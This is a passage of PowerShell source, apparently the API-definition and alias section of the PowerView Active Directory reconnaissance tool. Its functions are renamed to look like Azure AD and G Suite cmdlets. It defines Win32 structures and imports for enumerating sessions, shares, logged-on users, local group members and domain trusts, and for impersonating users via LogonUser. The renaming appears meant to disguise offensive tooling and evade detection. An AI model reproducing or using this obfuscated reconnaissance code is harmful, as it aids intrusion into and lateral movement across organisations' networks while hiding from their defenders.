    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield
$uacenum = get-azureadtenantdetail $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield
$wtsconnectstate = get-azureadtenantdetail $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
$wts_session_info_1 = remove-azureadcontactmanager $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = get-azureadobjectbyobjectid 0 UInt32
    State = get-azureadobjectbyobjectid 1 $WTSConnectState
    SessionId = get-azureadobjectbyobjectid 2 UInt32
    pSessionName = get-azureadobjectbyobjectid 3 String -MarshalAs @('LPWStr')
    pHostName = get-azureadobjectbyobjectid 4 String -MarshalAs @('LPWStr')
    pUserName = get-azureadobjectbyobjectid 5 String -MarshalAs @('LPWStr')
    pDomainName = get-azureadobjectbyobjectid 6 String -MarshalAs @('LPWStr')
    pFarmName = get-azureadobjectbyobjectid 7 String -MarshalAs @('LPWStr')
}
$wts_client_address = remove-azureadcontactmanager $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = get-azureadobjectbyobjectid 0 UInt32
    Address = get-azureadobjectbyobjectid 1 Byte[] -MarshalAs @('ByValArray', 20)
}
$share_info_1 = remove-azureadcontactmanager $Mod PowerView.ShareInfo @{
    Name = get-azureadobjectbyobjectid 0 String -MarshalAs @('LPWStr')
    Type = get-azureadobjectbyobjectid 1 UInt32
    Remark = get-azureadobjectbyobjectid 2 String -MarshalAs @('LPWStr')
}
$wksta_user_info_1 = remove-azureadcontactmanager $Mod PowerView.LoggedOnUserInfo @{
    UserName = get-azureadobjectbyobjectid 0 String -MarshalAs @('LPWStr')
    LogonDomain = get-azureadobjectbyobjectid 1 String -MarshalAs @('LPWStr')
    AuthDomains = get-azureadobjectbyobjectid 2 String -MarshalAs @('LPWStr')
    LogonServer = get-azureadobjectbyobjectid 3 String -MarshalAs @('LPWStr')
}
$session_info_10 = remove-azureadcontactmanager $Mod PowerView.SessionInfo @{
    CName = get-azureadobjectbyobjectid 0 String -MarshalAs @('LPWStr')
    UserName = get-azureadobjectbyobjectid 1 String -MarshalAs @('LPWStr')
    Time = get-azureadobjectbyobjectid 2 UInt32
    IdleTime = get-azureadobjectbyobjectid 3 UInt32
}
$sid_name_use = get-azureadtenantdetail $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
$localgroup_info_1 = remove-azureadcontactmanager $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = get-azureadobjectbyobjectid 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = get-azureadobjectbyobjectid 1 String -MarshalAs @('LPWStr')
}
$localgroup_members_info_2 = remove-azureadcontactmanager $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = get-azureadobjectbyobjectid 0 IntPtr
    lgrmi2_sidusage = get-azureadobjectbyobjectid 1 $SID_NAME_USE
    lgrmi2_domainandname = get-azureadobjectbyobjectid 2 String -MarshalAs @('LPWStr')
}
$dsdomainflag = get-azureadtenantdetail $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$dsdomaintrusttype = get-azureadtenantdetail $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$dsdomaintrustattributes = get-azureadtenantdetail $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
$ds_domain_trusts = remove-azureadcontactmanager $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = get-azureadobjectbyobjectid 0 String -MarshalAs @('LPWStr')
    DnsDomainName = get-azureadobjectbyobjectid 1 String -MarshalAs @('LPWStr')
    Flags = get-azureadobjectbyobjectid 2 $DsDomainFlag
    ParentIndex = get-azureadobjectbyobjectid 3 UInt32
    TrustType = get-azureadobjectbyobjectid 4 $DsDomainTrustType
    TrustAttributes = get-azureadobjectbyobjectid 5 $DsDomainTrustAttributes
    DomainSid = get-azureadobjectbyobjectid 6 IntPtr
    DomainGuid = get-azureadobjectbyobjectid 7 Guid
}
$netresourcew = remove-azureadcontactmanager $Mod NETRESOURCEW @{
    dwScope =         get-azureadobjectbyobjectid 0 UInt32
    dwType =          get-azureadobjectbyobjectid 1 UInt32
    dwDisplayType =   get-azureadobjectbyobjectid 2 UInt32
    dwUsage =         get-azureadobjectbyobjectid 3 UInt32
    lpLocalName =     get-azureadobjectbyobjectid 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    get-azureadobjectbyobjectid 5 String -MarshalAs @('LPWStr')
    lpComment =       get-azureadobjectbyobjectid 6 String -MarshalAs @('LPWStr')
    lpProvider =      get-azureadobjectbyobjectid 7 String -MarshalAs @('LPWStr')
}
$functiondefinitions = @(
    (set-azureadmsconditionalaccesspolicy netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (set-azureadmsconditionalaccesspolicy netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (set-azureadmsconditionalaccesspolicy netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (set-azureadmsconditionalaccesspolicy netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (set-azureadmsconditionalaccesspolicy netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (set-azureadmsconditionalaccesspolicy netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (set-azureadmsconditionalaccesspolicy netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (set-azureadmsconditionalaccesspolicy netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (set-azureadmsconditionalaccesspolicy advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (set-azureadmsconditionalaccesspolicy advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (set-azureadmsconditionalaccesspolicy advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (set-azureadmsconditionalaccesspolicy advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (set-azureadmsconditionalaccesspolicy advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (set-azureadmsconditionalaccesspolicy advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (set-azureadmsconditionalaccesspolicy wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (set-azureadmsconditionalaccesspolicy wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (set-azureadmsconditionalaccesspolicy wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (set-azureadmsconditionalaccesspolicy wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (set-azureadmsconditionalaccesspolicy wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (set-azureadmsconditionalaccesspolicy wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (set-azureadmsconditionalaccesspolicy Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
    (set-azureadmsconditionalaccesspolicy Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (set-azureadmsconditionalaccesspolicy kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)
$types = $FunctionDefinitions | get-azureaddevice -Module $Mod -Namespace 'Win32'
$netapi32 = $Types['netapi32']
$advapi32 = $Types['advapi32']
$wtsapi32 = $Types['wtsapi32']
$mpr = $Types['Mpr']
$kernel32 = $Types['kernel32']
Set-Alias select-azureadgroupidsserviceprincipalismemberof remove-azureadgroupowner
Set-Alias get-azureaduserapproleassignment Get-DomainDNSZone
Set-Alias remove-azureaduserapproleassignment Get-DomainDNSRecord
Set-Alias new-azureadapplicationextensionproperty select-azureadgroupidsuserismemberof
Set-Alias remove-azureadapplicationproxyapplicationconnectorgroup get-gsuserlicense
Set-Alias get-azureaduserdirectreport get-azureadmsadministrativeunitmember
Set-Alias get-gsteamdrive new-azureadmsapplicationkey
Set-Alias remove-azureadcontact Get-ForestGlobalCatalog
Set-Alias get-gsuserasp new-azureadserviceprincipalkeycredential
Set-Alias remove-azureadapplicationowner Get-DomainUserEvent
Set-Alias get-azureadapplicationpasswordcredential get-gscalendarresourcelist
Set-Alias get-azureadcontract Get-DomainObject
Set-Alias get-azureadapplicationproxyapplicationconnectorgroup Set-DomainObject
Set-Alias set-azureadmsapplication set-azureadmsauthorizationpolicy
Set-Alias set-azureaduserlicense new-azureadgroup
Set-Alias get-azureadcontactthumbnailphoto get-azureadcontact
Set-Alias remove-azureadmsscopedrolemembership Get-DomainGUIDMap
Set-Alias add-azureaddeviceregisteredowner Get-DomainOU
Set-Alias new-azureadmspermissiongrantpolicy Get-DomainSite
Set-Alias get-gsresource Get-DomainSubnet
Set-Alias get-azureadapplicationlogo set-azureadmsgroup
Set-Alias new-azureadserviceapproleassignment Get-DomainManagedSecurityGroup
Set-Alias set-azureadtrustedcertificateauthority get-gsgmailfilterlist
Set-Alias get-azureadmsapplicationowner set-azureadapplicationlogo
Set-Alias get-azureadmspermissiongrantconditionset get-gsuserlicenseinfo
Set-Alias get-gsusertoken Get-DomainGPO
Set-Alias get-azureadmsidentityprovider Get-DomainGPOLocalGroup
Set-Alias remove-azureadmsapplicationverifiedpublisher Get-DomainGPOUserLocalGroupMapping
Set-Alias remove-azureadmsdeleteddirectoryobject Get-DomainGPOComputerLocalGroupMapping
Set-Alias remove-azureaduser Get-RegLoggedOn
Set-Alias get-azureadserviceprincipalcreatedobject Test-AdminAccess
Set-Alias new-azureadmsgrouplifecyclepolicy Get-NetComputerSiteName
Set-Alias set-azureadapplication Get-WMIRegProxy
Set-Alias get-gsmobiledevicelist Get-WMIRegLastLoggedOn
Set-Alias add-azureadapplicationowner Get-WMIRegCachedRDPConnection
Set-Alias remove-azureadapplicationproxyconnectorgroup Get-WMIRegMountedDrive
Set-Alias get-azureaddomainserviceconfigurationrecord Get-WMIProcess
Set-Alias get-azureadoauth2permissiongrant New-ThreadedFunction
Set-Alias get-azureadserviceprincipalmembership Find-DomainUserLocation
Set-Alias remove-azureaddeletedapplication Find-DomainProcess
Set-Alias remove-azureaduserextension Find-DomainUserEvent
Set-Alias remove-azureadapplicationextensionproperty new-azureadapplicationkeycredential
Set-Alias set-azureadapplicationproxyconnector set-azureaduser
Set-Alias new-azureadserviceprincipalpasswordcredential Find-DomainLocalGroupMember
Set-Alias get-azureadusercreatedobject get-gsgmailsignature
Set-Alias remove-azureadmsapplicationpassword get-azureaddomainnamereference
Set-Alias get-azureadapplicationserviceendpoint Get-DomainForeignUser
Set-Alias get-azureaddeviceregisteredowner Get-DomainForeignGroupMember
Set-Alias get-azureadmsgrouplifecyclepolicy Get-DomainTrustMapping
Set-Alias confirm-azureaddomain Get-DomainPolicyData
